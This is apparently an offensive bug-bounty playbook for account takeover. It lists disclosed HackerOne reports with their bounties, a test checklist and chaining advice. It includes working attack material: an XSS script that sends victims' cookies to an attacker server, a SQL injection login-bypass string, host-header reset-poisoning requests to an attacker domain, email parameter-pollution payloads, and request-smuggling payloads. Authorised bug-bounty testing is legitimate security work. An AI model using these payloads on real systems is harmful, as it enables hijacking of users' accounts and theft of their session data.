# Real-World Playbook — Account Takeover (ATO)

**Class:** `account-takeover` · **Coverage-matrix tier:** 0 · **Hunter2:** /auth-hunt · tools/h1_oauth_tester.py · tools/jwt_scanner.py · tools/h1_idor_scanner.py · **Skill:** auth-attacks
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed Account Takeover reports peak at **$35,000**. Rewarded across: Chaturbate, GitLab, HackerOne, LY Corporation, Mail.ru, New Relic, Superhuman (formerly Grammarly), TikTok.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Account Takeover via Password Reset without user interactions** — GitLab, $35,000 · 968👍 · [2293343](https://hackerone.com/reports/2293343)
- **Account takeover via leaked session cookie** — HackerOne, $20,000 · 1640👍 · [745324](https://hackerone.com/reports/745324)
- **Account Takeover via Authentication Bypass in TikTok Account Recovery** — TikTok, $12,000 · 171👍 · [2443228](https://hackerone.com/reports/2443228)
- **Ability to DOS any organization's SSO and open up the door to account takeovers** — Superhuman (formerly Grammarly), $10,500 · 259👍 · [976603](https://hackerone.com/reports/976603)
- **password reset token leaking allowed for ATO of an Uber account** — Uber, $10,000 · 100👍 · [173551](https://hackerone.com/reports/173551)
- **[CRITICAL] -- Complete Account Takeover** — Uber, $8,000 · 87👍 · [136885](https://hackerone.com/reports/136885)
- **Account Takeover via billing** — Chaturbate, $8,000 · 55👍 · [394329](https://hackerone.com/reports/394329)
- **Spring Actuator endpoints publicly available, leading to account takeover** — LY Corporation, $5,000 · 143👍 · [862589](https://hackerone.com/reports/862589)
- **Account TakeOver through password recovery at am.ru** — Mail.ru, $3,000 · 139👍 · [730067](https://hackerone.com/reports/730067)
- **Stored XSS on auth.uber.com/oauth/v2/authorize via redirect_uri parameter leads to Account Takeover** — Uber, $3,000 · 52👍 · [397497](https://hackerone.com/reports/397497)
- **[help.steampowered.com] Account takeover bruteforcing SteamGuard** — Valve, $2,500 · 111👍 · [407971](https://hackerone.com/reports/407971)
- **Account takeover due to insufficient URL validation on RelayState parameter** — GitLab, $2,450 · 98👍 · [1923672](https://hackerone.com/reports/1923672)
- **Account Takeover via Email ID Change and Forgot Password Functionality** — New Relic, $2,048 · 214👍 · [1089467](https://hackerone.com/reports/1089467)
- **Account Takeover at vseapteki.ru** — Mail.ru, $2,000 · 142👍 · [707231](https://hackerone.com/reports/707231)
- **Account Takeover worki.ru** — Mail.ru, $1,700 · 391👍 · [744662](https://hackerone.com/reports/744662)
- **Account TakeOver at my.33slona.ru** — Mail.ru, $1,700 · 359👍 · [773519](https://hackerone.com/reports/773519)
- **Account Takeover at worki.ru** — Mail.ru, $1,500 · 143👍 · [725707](https://hackerone.com/reports/725707)
- **Account takeover at geekbrains.ru** — Mail.ru, $1,500 · 15👍 · [761655](https://hackerone.com/reports/761655)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

[ ] **a lot of ideas in this article by omar hashem**
```
https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5
```
[ ] **OAuth to Account takeover**
```
https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
```


[ ] **Pre-Account Takeover**                                                  

A pre-account takeover occurs when an attacker creates a user account using one signup method and the victim creates another account using a different signup method using the same email address. Because the email addresses are the same, the application connects the two accounts. when the app is unable to validate email addresses.
```
How to hunt :-
    Try registering any email address without verifying it.
    Try registering an account again, but this time with a different method, such as ‘sign up with Google’ from same email address.
    Due to the fact that both email addresses are the same, the web application will link the two accounts.
    Now try logging in using the specified password and username. Check to see whether you can see information from that account that was retrieved via Google.
```


[ ] **Account takeover due to Improper Rate limit**
```
How to Hunt:-

    capture the request at the login page, while providing username and password.
    send it to intruder and Brute force it.
    Analyze the response and length.
```


[ ] **Account takeover by utilizing sensitive data exposure**
```
Sensitive data exposure occurs when a web application failed to properly protect confidential information, resulting in the disclosure of sensitive information or data about users, or anything related to them, to a third party.

Occasionally, the application displays unnecessary data, such as valid OTPs, hashes, or passwords, over the request and response parts. So it’s a good idea to pay attention to the response and request portions.
```


[ ] **login**                                                                                                                                 
```
1. check if you are able to brute force the password
2. Test for OAuth misconfigurations
3. check if you are able to bruteforce the login OTP
4. check for JWT mesconfigurations
5. Test for SQL injection to bypass authentication ```admin" or 1=1;--```
6. check if the application validates the OTP or Token
```


[ ] **password reset**
```
1. check if you are able to brute force the password reset OTP
2. test for token predectability
3. test for JWT misconfigurations
4. check if the password reset endpoint is vulnerable to IDOR
5. check if the password reset endpoint is vulnerable to Host Header injection
6. check if the password reset endpoint is leaking the token or OTP in the HTTP response
7. check if the application validates the OTP or Token
8. test for HTTP parameter Pollution (HPP)
    
```


[ ] **XSS to Account Takeover**

if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password       
```
1. try to exfiltrate the cookies
2. try to exfiltrate the Auth Token
3. if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies
    - PoC Example:
        ```html
        
        <script>
            /*
            this script will create a hidden <img> element
            when the browser tries to load the image
            the victim's cookies will be sent to your server
            */

            var new_img = document.createElement('img');
            new_img.src = "http://yourserver/" + document.cookie;
            new_img.style = 'display: none;'
            document.body.appendChild(new_img);
        </script>

        ```
```


[ ] **CSRF to Account Takeover**
```
1. check if the email update endpoint is vulnerable to CSRF
2. check if the password change endpoint is vulnerable to CSRF
```


[ ] **IDOR to Account Takerover**
```
1. checck if the email update endpoint is vulnerable to IDOR
2. check if the password change endpoint is vulnerable to IDOR
3. check if the password reset endpoint vulnerable to IDOR
```


[ ] **Account takeover by Response & Status code Manipulation**


[ ] **Account takeover by exploiting Weak cryptography**
```
check this
https://infosecwriteups.com/weak-cryptography-in-password-reset-to-full-account-takeover-fc61c75b36b9
```


[ ] **Password or email change function**
```
IF you try to change password and see email parameter in password change request, Try changing your email to victim email
```


[ ] **Sing-Up Function**
```
IF you try to sing-up new account in target site, in email filed try set target email

IF you try to sing-up new account in target site using 3rd party, in 3d party use phone number instead email then link 3rd account with target site.Then Go setting try link victim email in you account
```

[ ] **Rest Token**
```
Try to use your REST Token with Target account. Hint: email=Target@email.com&code=$Attacker_TOKEN$

Brute Force Rest Token if it is numeric. Hint : email=Target@email.com&code=$TOKEN$

Try to figure out how the token are generated: 1. Generated based on TimeStamp OR ID of user OR email of user
```

[ ] **Host Header Injection**
```
when send rest account request intercept POST Request and Change Host header value from target.site TO Attacker.com: Hint POST /PassRest HTTP1/1 Host: Attacker.com
```

[ ] **CORS Misconfiguration to Account Takeover**

If the page contains CORS missconfigurations you might be able to steal sensitive information from the user to takeover his account or make him change auth information for the same purpose:
```
https://book.hacktricks.xyz/pentesting-web/cors-bypass
```
[ ] **Account takeover via leaked session cookie**
```
https://hackerone.com/reports/745324
```
[ ] **HTTP Request Smuggling to ATO**
```
https://hackerone.com/reports/737140
https://hackerone.com/reports/740037
```

[ ] **Bypassing Digits origin validation which leads to account takeover**
```
https://hackerone.com/reports/129873
```
[ ] Top ATO report in hackerone
```
https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
```

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: [ATTACKER.DOMAIN.TLD]
```
```
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
```
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
```
```
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
```
```
    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
    X: 
```
```
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
    X: X
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Account Takeover


#### **Authorization Issue**

The email of an account should be attempted to be changed, and the confirmation process **must be examined**. If found to be **weak**, the email should be changed to that of the intended victim and then confirmed.<sup>[[2]](#references)</sup>

#### **Unicode Normalization Issue**

1. The account of the intended victim `victim@gmail.com`
2. An account should be created using Unicode\
   for example: `vićtim@gmail.com`<sup>[[2]](#references)</sup>

As explained in [**this talk**](https://www.youtube.com/watch?v=CiIyaZ3x49c), the previous attack could also be done abusing third party identity providers:<sup>[[10]](#references)</sup>

- Create an account in the third party identity with similar email to the victim using some unicode character (`vićtim@company.com`).
  - The third party provider shouldn't verify the email
  - If the identity provider verifies the email, maybe you can attack the domain part like: `victim@ćompany.com` and register that domain and hope that the identity provider generates the ascii version of the domain while the victim platform normalize the domain name.
- Login via this identity provider in the victim platform who should normalize the unicode character and allow you to access the victim account.

##### Unicode/email parser disagreement


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- This IS the top chain sink — route IDOR / open-redirect / XSS / reset-poisoning / OAuth here
- Password-reset token leak/predict → set new password → ATO
- Email-change IDOR → change victim email → reset → ATO
- OAuth code/token theft via open redirect or referrer leak → ATO
- Session-fixation / cookie misbinding → ATO

## Hunter2 wiring
- **Run:** `/auth-hunt · tools/h1_oauth_tester.py · tools/jwt_scanner.py · tools/h1_idor_scanner.py`
- **Skill:** `auth-attacks`
- **Coverage-matrix tier:** 0 (Tier 0 = test first)
